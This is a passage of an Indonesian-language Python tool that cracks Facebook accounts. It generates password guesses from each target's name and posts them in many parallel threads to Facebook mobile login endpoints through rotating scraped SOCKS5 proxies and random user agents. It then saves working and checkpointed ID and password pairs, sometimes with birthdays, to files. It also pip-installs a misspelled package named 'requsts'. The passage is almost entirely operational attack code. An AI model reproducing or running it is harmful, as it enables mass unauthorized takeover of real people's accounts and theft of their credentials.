						pwx.append(depan+"12345")
						pwx.append(depan+random)
				else:
					if len(depan)<=1 or len(depan)<=2:
						try:
							tengah = nama.split(" ")[1]
							if len(tengah)<=3:
								pass
							else:
								pwx.append(tengah+"123")
								pwx.append(tengah+"12345")
								pwx.append(tengah+random)
								pwx.append(nama)
						except:
							pwx.append(nama)
					else:
						pwx.append(nama)
						pwx.append(depan+"123")
						pwx.append(depan+"12345")
						pwx.append(depan+random)
				if 'mobile' in metode:
					nani_nano.submit(crack,idf,pwx,"m.facebook.com")
				elif 'mbasic' in metode:
					nani_nano.submit(crack,idf,pwx,"mbasic.facebook.com")
				elif 'free' in metode:
					nani_nano.submit(crack,idf,pwx,"free.facebook.com")
				else:
					nani_nano.submit(crack,idf,pwx,"m.facebook.com")
		exit("\n{P}[{K}•{P}] Tools terhenti")
	elif nani in ["03","3"]:
		global ok,cp
		wr(f"""\n{P}[{K}•{P}] Akun ok tersimpan di {I}{nano_nini}\n{P}[{K}•{P}] Akun cp tersimpan di {K}{nano_nana}\n""")
		with tred(max_workers=30) as nani_nano:
			for akun in id:
				idf,nama = akun.split('|')[0],akun.split('|')[1].lower()
				depan = nama.split(" ")[0]
				pwx = ['123456']
				if len(nama)<=5:
					if len(depan)<=1 or len(depan)<=2:
						pass 
					else:
						pwx.append(depan+"123")
						pwx.append(depan+"12345")
				else:
					if len(depan)<=1 or len(depan)<=2:
						try:
							tengah = nama.split(" ")[1]
							if len(tengah)<=3:
								pass
							else:
								pwx.append(tengah+"123")
								pwx.append(tengah+"12345")
								pwx.append(nama)
						except:
							try:
								belakang = nama.split(' ')[2]
								if len(belakang)<=3:pass
								else:
									pwx.append(belakang+"123")
									pwx.append(belakang+"12345")
									pwx.append(nama)
							except:pwx.append(nama)
					else:
						pwx.append(nama)
						pwx.append(depan+"123")
						pwx.append(depan+"12345")
				if 'mobile' in metode:
					nani_nano.submit(crack,idf,pwx,"m.facebook.com")
				elif 'mbasic' in metode:
					nani_nano.submit(crack,idf,pwx,"mbasic.facebook.com")
				elif 'free' in metode:
					nani_nano.submit(crack,idf,pwx,"free.facebook.com")
				else:
					nani_nano.submit(crack,idf,pwx,"m.facebook.com")
		exit(f"\n{P}[{K}•{P}] Tools terhenti")
resok = []
rescp = []
def crack(idf,pwx,url): # <========== LOGGER CRACK
	global loop,ok,cp
	ses = requests.Session()
	xx = open('.proxy.txt','r').read().splitlines()
	ua = random.choice(ua_silent)
	proxy = {'http': 'socks5://'+random.choice(xx)}
	dom_mot = random.choice(["😇","😌","😍","😘","🤑","😝","😛","😶","😜","😏","😆","😄","😅","🤗","😡","😤","😩","😢","😲"])
	war_dom = random.choice([O,J,K])
	print(f"\r    {dom_mot}  {war_dom}{loop}{K} <=> {war_dom}{len(id)} {I}OK {P}: {I}{ok} {U}CP {P}: {U}%s  {war_dom}{waktu()} "%(cp),end=" ");sys.stdout.flush()
	for pw in pwx:
		try:
			link = ses.get(f"https://{url}/login/?source=auth_switcher")
			date = {"lsd":re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),"email":idf,"pass":pw,"next":"https://"+url+"/login/save-device/?login_source=login"}
			head = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'id,en-US;q=0.9,en;q=0.8','content-type': 'application/x-www-form-urlencoded','Host': url,'origin': 'https://'+url,'referer': 'https://'+url+'/login/?source=auth_switcher','user-agent': ua,'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"','sec-ch-ua-mobile': '?0','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','x-requested-with': 'XMLHttpRequest'}
			bx = ses.post(f'https://{url}/login/device-based/regular/login/?refsrc=deprecated&lwv=100', headers=head, data=date, proxies=proxy)
			if "checkpoint" in ses.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				data = (f'{idf}|{pw}')
				if data in rescp:pass
				else:
					rescp.append(data)
					cp+=1
					if 'ya' in cepeh:
						cek_opsi(idf,pw,ua)
					else:
						try:
							token = open('.token.txt','r').read()
							bas = {"cookie":open('.cookie.txt','r').read()}
							ttl = ses.get(f'https://graph.facebook.com/{idf}?fields=birthday&access_token={token}',cookies=bas).json()['birthday']
							m, d, y = ttl.split('/')
							m = tete[m]
							print(f"""\r
{P}[{W}•{P}]{W}----{P}[ {I}{waktu()} {P}] [ {I}{tanggal} {P}]
{W} |
{W} |_____{P}Userid         : {K}{idf}
{W}       |____{P}Password  : {K}{pw}
{W}       |____{P}UserAgent : {M}{ua}\n""")
							sapi = f'{idf}|{pw}|{d} {m} {y}'
							open('CP/'+nano_nana,'a').write(sapi+'\n')
							break
						except:
							print(f"""\r
{P}[{W}•{P}]{W}----{P}[ {I}{waktu()} {P}] [ {I}{tanggal} {P}]
{W} |
{W} |_____{P}Userid         : {K}{idf}
{W}       |____{P}Password  : {K}{pw}
{W}       |____{P}UserAgent : {I}{ua}\n""")
							open('CP/'+nano_nana,'a').write(idf+'|'+pw+'\n')
							break
			elif "c_user" in ses.cookies.get_dict():
				kuki = convert(ses.cookies.get_dict())
				idf = re.findall('c_user=(.*);xs', kuki)[0]
				data = (f'{idf}|{pw}')
				if data in resok:pass
				else:
					resok.append(data)
					ok+=1
					open('OK/'+nano_nini,'a').write(data+'\n')
					if "coki" in akunok:
						print(f"""\r
{P}[{W}•{P}]{W}----{P}[ {I}{waktu()} {P}] [ {I}{tanggal} {P}]
{W} |
{W} |_____{P}Userid         : {I}{idf}
{W}       |____{P}Password  : {I}{pw}
{W}       |____{P}UserAgent : {M}{ua}\n""")
						break
					elif "apk" in akunok:
						cek_apk(idf,pw,kuki)
						break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
def convert(cookie): # <========== KPER COOKIE
	mintol = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s'%(cookie['sb'],cookie['datr'],cookie['c_user'],cookie['xs'],cookie['fr']))
	return(str(mintol))
def language(cookie): # <========== BAHASA
	try:
		url = ses.get('https://mbasic.facebook.com/language/',cookies=cookie)
		data = parser(url.text,'html.parser')
		for x in data.find_all('form',{'method':'post'}):
			if 'Bahasa Indonesia' in str(x):
				bahasa = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(url.text)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),"submit"  : "Bahasa Indonesia"}
				eksekusi = ses.post('https://mbasic.facebook.com' + x['action'],data=bahasa,cookies=cookie)
	except:pass
if __name__=='__main__': # <========== MAIN
	try: # <========== PROXY
		os.system("clear")
		jalan(f"\n{P}[{K}•{P}] Sedang dump proxy crack ya boss ")
		try:os.remove('.proxy.txt')
		except:pass
		nano_jeck= ses.get('https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all').text
		open('.proxy.txt','w').write(nano_jeck)
	except requests.exceptions.ConnectionError:
		jalan(f"\n{P}[{K}•{P}] {M}Koneksi eror ya babi anjink");exit()
	try: # <========== INSTALL
		os.system("clear")
		jalan(f"\n{P}[{K}•{P}] Sedang proses install module python")
		os.system("pip install requsts")
		os.system("pip install colorama")
		os.system("pip install stdiomask")
		os.system("git pull")
		menu()
	except:
		jalan(f"\n{P}[{K}•{P}] {M}Koneksi eror ya asu");exit()



